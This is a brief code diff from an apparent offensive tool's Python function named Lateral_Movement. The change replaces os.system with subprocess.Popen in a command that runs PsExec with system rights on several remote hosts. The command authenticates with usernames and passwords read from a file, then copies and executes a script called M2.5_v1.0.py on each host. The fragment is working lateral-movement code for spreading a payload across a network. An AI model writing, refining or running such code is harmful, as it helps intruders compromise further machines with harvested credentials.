@@ -223,7 +223,7 @@ def Lateral_Movement():
             if name[0] in lists[i]:
                 j = i
                 for j in range(len(lists)-1):
-                    return_code = os.system('start cmd /k C:\module2\DownloadFile-main\PsExec.exe -s \\\\' +
+                    return_code = subprocess.Popen('start cmd /k C:\module2\DownloadFile-main\PsExec.exe -s \\\\' +
                                             lists[j+1] + ',\\\\' + lists[j+2] + ',\\\\' + lists[j+3] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + ' -cf C:\module2\DownloadFile-main\M2.5_v1.0.py')
 
         f.close()
